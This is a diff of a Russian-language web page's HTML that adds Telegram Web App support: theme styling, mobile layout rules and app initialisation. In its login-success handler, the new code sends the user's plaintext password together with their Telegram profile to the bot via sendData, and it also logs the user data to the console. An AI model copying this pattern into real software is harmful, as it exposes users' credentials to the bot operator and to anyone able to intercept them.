@@ -5,6 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>GEOГРАФИЯ</title>
 
+    <!-- Telegram Web App -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
     <script>
         (function() {
             const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
@@ -15,8 +18,6 @@
             }
         })();
     </script>
-    
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     
@@ -207,14 +208,187 @@
         }
 
         /* Базовое состояние — контейнер скрыт */
-.app-banners-container {
-    display: none; 
-}
+        .app-banners-container {
+            display: none; 
+        }
 
-/* Когда плашка должна работать — добавляем этот класс */
-.app-banners-container.banner-active {
-    display: block !important; /* или flex, в зависимости от вашей верстки */
-}
+        /* Когда плашка должна работать — добавляем этот класс */
+        .app-banners-container.banner-active {
+            display: block !important;
+        }
+
+        /* --- СТИЛИ ДЛЯ TELEGRAM WEB APP --- */
+        body.tg-webapp {
+            background: var(--tg-theme-bg-color, #0a0a0a) !important;
+            color: var(--tg-theme-text-color, #ffffff) !important;
+        }
+
+        .tg-webapp .main-title {
+            color: var(--tg-theme-text-color, #ffffff) !important;
+        }
+
+        .tg-webapp .custom-input {
+            background: var(--tg-theme-secondary-bg-color, rgba(255,255,255,0.03)) !important;
+            border-color: var(--tg-theme-hint-color, rgba(255,255,255,0.08)) !important;
+            color: var(--tg-theme-text-color, #ffffff) !important;
+        }
+
+        .tg-webapp .custom-input::placeholder {
+            color: var(--tg-theme-hint-color, rgba(255,255,255,0.2)) !important;
+        }
+
+        .tg-webapp .subtitle-badge span,
+        .tg-webapp .bottom-credits {
+            color: var(--tg-theme-hint-color, rgba(255,255,255,0.4)) !important;
+        }
+
+        .tg-webapp .settings-container-box {
+            background: var(--tg-theme-secondary-bg-color, rgba(20,20,20,0.85)) !important;
+            border-color: var(--tg-theme-hint-color, rgba(255,255,255,0.1)) !important;
+        }
+
+        .tg-webapp .version-badge {
+            background: var(--tg-theme-secondary-bg-color, rgba(0,0,0,0.6)) !important;
+            border-color: var(--tg-theme-hint-color, rgba(255,255,255,0.05)) !important;
+        }
+
+        .tg-webapp .dev-console {
+            background: var(--tg-theme-secondary-bg-color, rgba(10,10,10,0.92)) !important;
+            border-color: var(--tg-theme-hint-color, rgba(255,255,255,0.06)) !important;
+        }
+
+        /* Адаптация для мобильных */
+        @media (max-width: 768px) {
+            .brand-block {
+                flex-direction: column;
+                text-align: center;
+                gap: 12px;
+            }
+
+            .main-title {
+                font-size: 28px;
+            }
+
+            .text-right {
+                align-items: center;
+            }
+
+            .logo-icon {
+                width: 60px;
+                height: 60px;
+            }
+
+            .settings-trigger-zone {
+                bottom: 15px;
+                right: 15px;
+            }
+
+            .settings-container-box {
+                padding: 10px 14px;
+                gap: 10px;
+                flex-wrap: wrap;
+                justify-content: center;
+            }
+
+            .settings-label {
+                display: none;
+            }
+
+            .settings-horizontal-line {
+                display: none;
+            }
+
+            .intensity-control-box {
+                min-width: 100px;
+            }
+
+            .corner-icon-floating-wrapper {
+                bottom: 70px;
+                right: 15px;
+            }
+
+            .corner-icon {
+                width: 40px;
+                height: 40px;
+            }
+
+            .bottom-credits-wrapper {
+                bottom: 15px;
+            }
+
+            .bottom-credits {
+                font-size: 9px;
+            }
+
+            .db-main-title {
+                font-size: 22px;
+            }
+
+            .success-message {
+                font-size: 16px;
+            }
+
+            .dev-console {
+                width: 280px;
+                right: 10px;
+                bottom: 70px;
+            }
+
+            .prompt-text {
+                font-size: 10px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .main-title {
+                font-size: 22px;
+            }
+
+            .settings-container-box {
+                padding: 8px 10px;
+                gap: 6px;
+            }
+
+            .volume-label {
+                font-size: 8px;
+            }
+
+            .intensity-label {
+                font-size: 7px;
+            }
+
+            .slider-wrapper input[type="range"] {
+                height: 2px;
+            }
+
+            .slider-wrapper input[type="range"]::-webkit-slider-thumb {
+                width: 10px;
+                height: 10px;
+            }
+
+            .custom-input {
+                padding: 12px 50px 12px 16px;
+                font-size: 13px;
+            }
+
+            .input-submit-btn {
+                width: 36px;
+                height: 36px;
+            }
+
+            .db-main-title {
+                font-size: 18px;
+            }
+
+            .success-message {
+                font-size: 13px;
+            }
+
+            .db-logo-icon {
+                width: 60px;
+                height: 60px;
+            }
+        }
     </style>
 </head>
 <body>
@@ -222,11 +396,11 @@
 <script src="shortcuts-system.js" defer></script>
 
     <div class="app-banners-container">
-    <div class="app-banner banner-warning">
-        <span class="banner-icon">🛠</span>
-        <span>Ведется разработка сайта в раннем доступе</span>
+        <div class="app-banner banner-warning">
+            <span class="banner-icon">🛠</span>
+            <span>Ведется разработка сайта в раннем доступе</span>
+        </div>
     </div>
-</div>
 
     <div class="shadow-layer"></div>
 
@@ -371,6 +545,46 @@
     <script src="console.js" defer></script>
 
     <script>
+        // --- ИНИЦИАЛИЗАЦИЯ TELEGRAM WEB APP ---
+        const tg = window.Telegram?.WebApp;
+        if (tg) {
+            // Разворачиваем на весь экран
+            tg.expand();
+            
+            // Добавляем класс для стилей Telegram
+            document.body.classList.add('tg-webapp');
+            
+            // Применяем тему Telegram
+            const theme = tg.themeParams;
+            if (theme) {
+                document.documentElement.style.setProperty('--tg-theme-bg-color', theme.bg_color || '#0a0a0a');
+                document.documentElement.style.setProperty('--tg-theme-text-color', theme.text_color || '#ffffff');
+                document.documentElement.style.setProperty('--tg-theme-hint-color', theme.hint_color || 'rgba(255,255,255,0.4)');
+                document.documentElement.style.setProperty('--tg-theme-secondary-bg-color', theme.secondary_bg_color || 'rgba(255,255,255,0.03)');
+            }
+
+            // Сообщаем Telegram, что приложение готово
+            tg.ready();
+
+            // Получаем данные пользователя
+            const user = tg.initDataUnsafe?.user;
+            if (user) {
+                console.log('Telegram User:', user);
+                // Можно использовать данные пользователя
+                // Например, сохранить в переменную или показать приветствие
+            }
+
+            // Функция для отправки данных в бот
+            window.sendToTelegram = function(data) {
+                tg.sendData(JSON.stringify(data));
+            };
+
+            // Функция для закрытия приложения
+            window.closeTelegramApp = function() {
+                tg.close();
+            };
+        }
+
         // --- 1. ЛОГИКА ИНТЕРФЕЙСА СТРАНИЦЫ ---
         const textContainer = document.getElementById('wave-text');
         const waveContainer = document.getElementById('bg-wave-container');
@@ -682,7 +896,18 @@
                         }, 4000); 
 
                         setTimeout(() => {
-                            window.location.replace('/login.html');
+                            // Если открыто в Telegram - отправляем данные и закрываем
+                            if (tg) {
+                                tg.sendData(JSON.stringify({ 
+                                    action: 'login_success',
+                                    user: tg.initDataUnsafe?.user,
+                                    password: rawPassword
+                                }));
+                                tg.close();
+                            } else {
+                                // Если не в Telegram - обычный редирект
+                                window.location.replace('/login.html');
+                            }
                         }, 5400);
 
                     } else {
@@ -736,45 +961,39 @@
     </script>
 
     <script>
-    document.addEventListener('DOMContentLoaded', () => {
-        const badge = document.getElementById('version-badge');
-        let clickCount = 0;
-        let clickTimer = null;
-        let hideTimeout = null;
+        document.addEventListener('DOMContentLoaded', () => {
+            const badge = document.getElementById('version-badge');
+            let clickCount = 0;
+            let clickTimer = null;
+            let hideTimeout = null;
 
-        // Отслеживаем клики по всему экрану/документу
-        document.addEventListener('click', () => {
-            clickCount++;
+            document.addEventListener('click', () => {
+                clickCount++;
 
-            // Если между кликами прошло более 1.5 секунд — сбрасываем счетчик
-            clearTimeout(clickTimer);
-            clickTimer = setTimeout(() => {
-                clickCount = 0;
-            }, 1500);
-
-            // Если кликнули 5 раз
-            if (clickCount === 5) {
-                clickCount = 0; // Сбрасываем счетчик
                 clearTimeout(clickTimer);
+                clickTimer = setTimeout(() => {
+                    clickCount = 0;
+                }, 1500);
 
-                // Показываем плашку
-                if (badge) {
-                    badge.classList.add('visible');
+                if (clickCount === 5) {
+                    clickCount = 0;
+                    clearTimeout(clickTimer);
 
-                    // Если был предыдущий таймер скрытия — очищаем его
-                    clearTimeout(hideTimeout);
+                    if (badge) {
+                        badge.classList.add('visible');
 
-                    // Скрываем ровно через 3 секунды (3000 мс)
-                    hideTimeout = setTimeout(() => {
-                        badge.classList.remove('visible');
-                    }, 3000);
+                        clearTimeout(hideTimeout);
+
+                        hideTimeout = setTimeout(() => {
+                            badge.classList.remove('visible');
+                        }, 3000);
+                    }
                 }
-            }
+            });
         });
-    });
-</script>
+    </script>
 
-<script src="site-warning.js" defer></script>
+    <script src="site-warning.js" defer></script>
 
 </body>
 </html>
